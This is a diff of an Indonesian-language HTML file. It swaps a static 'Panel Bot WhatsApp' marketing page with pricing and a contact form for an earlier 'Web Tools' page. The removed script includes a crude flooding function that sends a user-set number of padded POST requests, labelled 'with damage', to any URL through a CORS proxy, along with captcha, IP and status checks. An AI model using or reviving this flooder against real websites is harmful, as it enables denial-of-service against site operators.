@@ -3,184 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web Tools</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #5f2c82, #49a09d);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: #fff;
-        }
-        .container {
-            max-width: 600px;
-            padding: 20px;
-            background-color: rgba(255, 255, 255, 0.1);
-            box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.3);
-            border-radius: 12px;
-            text-align: center;
-            backdrop-filter: blur(10px);
-        }
-        h2 {
-            margin-bottom: 20px;
-            font-size: 24px;
-            color: #ffffff;
-        }
-        label {
-            font-weight: bold;
-            color: #ddd;
-        }
-        input[type="text"] {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0 20px;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-        button {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            font-size: 16px;
-            font-weight: bold;
-            color: #5f2c82;
-            background-color: #fff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s ease, color 0.3s ease;
-        }
-        button:hover {
-            background-color: #49a09d;
-            color: #fff;
-        }
-        .output {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 5px;
-            background-color: rgba(255, 255, 255, 0.2);
-            font-size: 14px;
-            color: #fff;
-            text-align: left;
-            white-space: pre-line;
-        }
-        .back-button {
-            display: none;
-            margin-top: 10px;
-            font-size: 14px;
-        }
-    </style>
+    <title>Panel Bot WhatsApp</title>
+    <link rel="stylesheet" href="styles.css"> <!-- Link untuk file CSS -->
 </head>
 <body>
-    <div class="container">
-        <h2>Web Tools REN9999</h2>
-        
-        <label for="urlInput">Masukkan URL:</label>
-        <input type="text" id="urlInput" placeholder="https://example.com">
-        
-        <button onclick="sendRequest()">1. Kirim Request dengan Damage</button>
-        <button onclick="checkCaptcha()">2. Cek CAPTCHA/Verifikasi Robot</button>
-        <button onclick="getIPAddress()">3. Cek Alamat IP Website</button>
-        <button onclick="checkWebsiteStatus()">4. Cek Status Website</button>
+    <header>
+        <h1>Panel Bot WhatsApp</h1>
+        <nav>
+            <ul>
+                <li><a href="#home">Home</a></li>
+                <li><a href="#features">Features</a></li>
+                <li><a href="#pricing">Pricing</a></li>
+                <li><a href="#contact">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
 
-        <div id="output" class="output"></div>
-        <button class="back-button" onclick="backToMenu()">Kembali ke Menu Awal</button>
-    </div>
+    <section id="home">
+        <h2>Selamat Datang di Panel Bot WhatsApp</h2>
+        <p>Otomatisasi percakapan dan manajemen pelanggan dengan mudah.</p>
+        <a href="#features" class="btn">Pelajari Lebih Lanjut</a>
+    </section>
 
-    <script>
-        const proxyUrl = "https://cors-anywhere.herokuapp.com/";
+    <section id="features">
+        <h2>Fitur Utama</h2>
+        <ul>
+            <li>Otomasi Chat</li>
+            <li>Integrasi API</li>
+            <li>Analitik Chat</li>
+            <li>Notifikasi Pesan</li>
+        </ul>
+    </section>
 
-        function displayOutput(message) {
-            document.getElementById("output").innerHTML += message + "\n";
-            document.querySelector(".back-button").style.display = "block";
-        }
+    <section id="pricing">
+        <h2>Paket Harga</h2>
+        <div class="pricing-card">
+            <h3>Basic</h3>
+            <p>Rp50.000/bulan</p>
+            <p>Fitur Otomasi Chat</p>
+            <button>Pesan Sekarang</button>
+        </div>
+        <div class="pricing-card">
+            <h3>Pro</h3>
+            <p>Rp150.000/bulan</p>
+            <p>Semua Fitur</p>
+            <button>Pesan Sekarang</button>
+        </div>
+    </section>
 
-        function backToMenu() {
-            document.getElementById("output").innerHTML = ""; 
-            document.querySelector(".back-button").style.display = "none";
-        }
+    <section id="contact">
+        <h2>Hubungi Kami</h2>
+        <form action="/send" method="POST">
+            <label for="name">Nama:</label>
+            <input type="text" id="name" name="name" required>
 
-        async function sendRequest() {
-            const url = proxyUrl + document.getElementById("urlInput").value;
-            const jumlahRequest = prompt("Masukkan jumlah request yang akan dikirim:");
-            const ukuranDamage = prompt("Masukkan ukuran damage per request (dalam byte):");
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" required>
 
-            if (jumlahRequest && ukuranDamage) {
-                document.getElementById("output").innerHTML = "";
-                document.querySelector(".back-button").style.display = "none"; 
-                for (let i = 1; i <= jumlahRequest; i++) {
-                    try {
-                        const response = await fetch(url, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                            body: 'A'.repeat(ukuranDamage)
-                        });
-                        
-                        if (response.ok) {
-                            displayOutput(`Permintaan berhasil dikirim (${i}) dari ${jumlahRequest}`);
-                        } else {
-                            displayOutput(`Gagal mengirim permintaan (${i}) dari ${jumlahRequest} dengan status code ${response.status}`);
-                        }
-                    } catch (error) {
-                        displayOutput(`Error mengirim permintaan (${i}) dari ${jumlahRequest}: ${error}`);
-                    }
-                }
-            }
-        }
+            <label for="message">Pesan:</label>
+            <textarea id="message" name="message" required></textarea>
 
-        async function checkCaptcha() {
-            const url = proxyUrl + document.getElementById("urlInput").value;
-            try {
-                document.getElementById("output").innerHTML = "";
-                const response = await fetch(url);
-                const text = await response.text();
-                if (text.toLowerCase().includes("captcha") || text.toLowerCase().includes("robot")) {
-                    displayOutput("Website mengandung CAPTCHA atau verifikasi robot.");
-                } else {
-                    displayOutput("Website tidak mengandung CAPTCHA atau verifikasi robot.");
-                }
-            } catch (error) {
-                displayOutput(`Error saat memeriksa CAPTCHA: ${error}`);
-            }
-        }
+            <button type="submit">Kirim</button>
+        </form>
+    </section>
 
-        async function getIPAddress() {
-            const url = document.getElementById("urlInput").value;
-            try {
-                document.getElementById("output").innerHTML = "";
-                const hostname = new URL(url).hostname;
-                const ip = await fetch(proxyUrl + `https://dns.google/resolve?name=${hostname}`)
-                    .then(res => res.json())
-                    .then(data => data.Answer[0].data);
-
-                displayOutput(`Alamat IP dari ${url}: ${ip}`);
-            } catch (error) {
-                displayOutput(`Error saat mendapatkan alamat IP: ${error}`);
-            }
-        }
-
-        async function checkWebsiteStatus() {
-            const url = proxyUrl + document.getElementById("urlInput").value;
-            try {
-                document.getElementById("output").innerHTML = "";
-                const response = await fetch(url, { method: 'HEAD' });
-                if (response.ok) {
-                    displayOutput("Website aktif dan berjalan.");
-                } else {
-                    displayOutput(`Website memberikan status code: ${response.status}.`);
-                }
-            } catch (error) {
-                displayOutput(`Kesalahan saat memeriksa status website: ${error}`);
-            }
-        }
-    </script>
+    <footer>
+        <p>© 2024 Panel Bot WhatsApp. All rights reserved.</p>
+    </footer>
 </body>
-  </html>
+</html>
